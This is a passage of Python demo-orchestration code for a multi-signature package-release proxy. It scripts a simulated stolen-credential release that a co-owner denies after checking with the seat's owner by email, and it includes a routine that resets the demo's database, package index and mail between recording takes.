    """9 a.m.: the diligent co-owner emails the seat's owner out-of-band and the owner
    (mailbox uncompromised — only the proxy credential was stolen) replies that they did
    not initiate it. Both are real emails. Returns ``(question_sent, reply_sent)``."""
    diligent = demo_lib.person(demo_lib.ACT2_DILIGENT)
    owner = demo_lib.person(demo_lib.ACT2_STOLEN_SEAT)
    question = VERIFICATION_QUESTION.format(owner=owner.given_name, asker=diligent.given_name)
    question_sent = send_human_email(
        stack,
        sender=diligent,
        to=owner,
        subject=VERIFICATION_SUBJECT,
        body=question,
    )
    reply_sent = send_human_email(
        stack,
        sender=owner,
        to=diligent,
        subject=f"Re: {VERIFICATION_SUBJECT}",
        body=quote_reply(
            VERIFICATION_REPLY.format(owner=owner.given_name),
            original=question,
            original_sender=diligent,
        ),
    )
    return question_sent, reply_sent


def verification_thread() -> list[MailpitMessage]:
    """The Act 2 out-of-band exchange as its two messages (question then reply), built from
    the same constants :func:`act2_verify_out_of_band` sends.

    The board renders this inline (:func:`render_thread_html`) as the "direct check" evidence.
    It is reconstructed from the sent content rather than read back from Mailpit on purpose:
    the shown inbox is scoped to the diligent owner, and the *question* is addressed to the
    seat's owner — so it is not in that inbox to fetch, yet the full question → reply still
    belongs in the on-camera thread. Oldest-first for natural order.
    """
    diligent = demo_lib.person(demo_lib.ACT2_DILIGENT)
    owner = demo_lib.person(demo_lib.ACT2_STOLEN_SEAT)
    return [
        MailpitMessage(
            id="",
            from_address=diligent.email,
            to_addresses=(owner.email,),
            subject=VERIFICATION_SUBJECT,
            snippet=VERIFICATION_QUESTION.format(owner=owner.given_name, asker=diligent.given_name),
        ),
        MailpitMessage(
            id="",
            from_address=owner.email,
            to_addresses=(diligent.email,),
            subject=f"Re: {VERIFICATION_SUBJECT}",
            snippet=VERIFICATION_REPLY.format(owner=owner.given_name),
        ),
    ]


def act2_diligent_deny(driver: ProxyDriver, request_id: str) -> httpx.Response:
    """The diligent co-owner denies on human context (no code review). This closes the
    request before quorum, so the executor never runs and 1.0.1 never reaches pypiserver."""
    return cast_vote(
        driver, demo_lib.person(demo_lib.ACT2_DILIGENT), request_id, DENY, reason=DENY_REASON
    )


def run_act2(driver: ProxyDriver, stack: DemoStack) -> Act2Result:
    """The whole Act 2 compromise-deny in narrative order (the backing check drives this)."""
    result = Act2Result()
    with driver.sessions() as session:
        result.stolen_token, result.request_id, result.artifact = act2_submit_from_stolen_seat(
            driver, session
        )
    act2_careless_rubber_stamp(driver, result.request_id)
    result.frozen_approvals, result.quorum = driver.tally(result.request_id)

    result.verification_sent, result.reply_sent = act2_verify_out_of_band(stack)
    act2_diligent_deny(driver, result.request_id)
    result.final_state = driver.state(result.request_id)
    return result


# --- reset between recording takes (US31) -----------------------------------


@dataclass
class ResetSummary:
    """What a demo reset cleared, for the notebook to report."""

    requests_deleted: int = 0
    tokens_deleted: int = 0
    index_removed: bool = False
    mail_cleared: bool = False


def reset_demo(driver: ProxyDriver, stack: DemoStack) -> ResetSummary:
    """Clear the demo's own request/artifact/vote/token rows and drop ``acme-widgets`` from
    the index, so a recording take can re-run in seconds without a container teardown.

    The team accounts are kept (re-provisioning is idempotent anyway); only the *workflow*
    state the acts create is removed, plus the whole Mailpit inbox (so a take does not open
    on a wall of prior-run mail). Index + mail removal are best-effort (pypiserver may run
    read-only) — a full cold start remains ``docker compose … down -v``.
    """
    from sqlalchemy import delete

    from msig_proxy.core.models import (
        ApprovalRequest,
        ApprovalRequestApprover,
        StagedArtifact,
        Vote,
    )

    summary = ResetSummary()
    with driver.sessions() as session:
        request_ids = list(
            session.scalars(
                select(ApprovalRequest.id).where(
                    ApprovalRequest.package_name == demo_lib.PACKAGE_NAME
                )
            )
        )
        if request_ids:
            for table in (Vote, ApprovalRequestApprover, StagedArtifact):
                session.execute(delete(table).where(table.approval_request_id.in_(request_ids)))
            session.execute(delete(ApprovalRequest).where(ApprovalRequest.id.in_(request_ids)))
            summary.requests_deleted = len(request_ids)

        demo_user_ids = list(
            session.scalars(
                select(User.id).where(User.username.in_([p.username for p in demo_lib.DEMO_TEAM]))
            )
        )
        demo_token_ids = list(
            session.scalars(select(ApiToken.id).where(ApiToken.user_id.in_(demo_user_ids)))
        )
        if demo_token_ids:
            session.execute(delete(ApiToken).where(ApiToken.id.in_(demo_token_ids)))
            summary.tokens_deleted = len(demo_token_ids)
        session.commit()

    summary.index_removed = _remove_from_index(stack, demo_lib.PACKAGE_NAME)
    summary.mail_cleared = delete_all_mail(stack)
    return summary


def _remove_from_index(stack: DemoStack, package: str) -> bool:
    """Best-effort removal of every ``package`` release from the live pypiserver."""
    try:
        with httpx.Client(base_url=stack.pypiserver_url, timeout=10) as client:
            versions = {
                _version_of(name) for name in parse_simple_index(_index_html(client, package))
            }
            for version in sorted(v for v in versions if v):
                client.post(
                    "/",
                    data={":action": "remove_pkg", "name": package, "version": version},
                )
    except httpx.HTTPError:
        return False
    return True


def _index_html(client: httpx.Client, package: str) -> str:
    response = client.get(f"/simple/{package}/")
    if response.status_code == httpx.codes.NOT_FOUND:
        return ""
    response.raise_for_status()
    return response.text


def _version_of(filename: str) -> str:
    """The version segment of an ``acme-widgets-<version>.tar.gz`` distribution filename."""
    match = re.search(
        rf"{re.escape(demo_lib.PACKAGE_NAME)}-([^-]+?)(?:-|\.tar\.gz|\.whl)", filename
    )
    return match.group(1) if match else ""
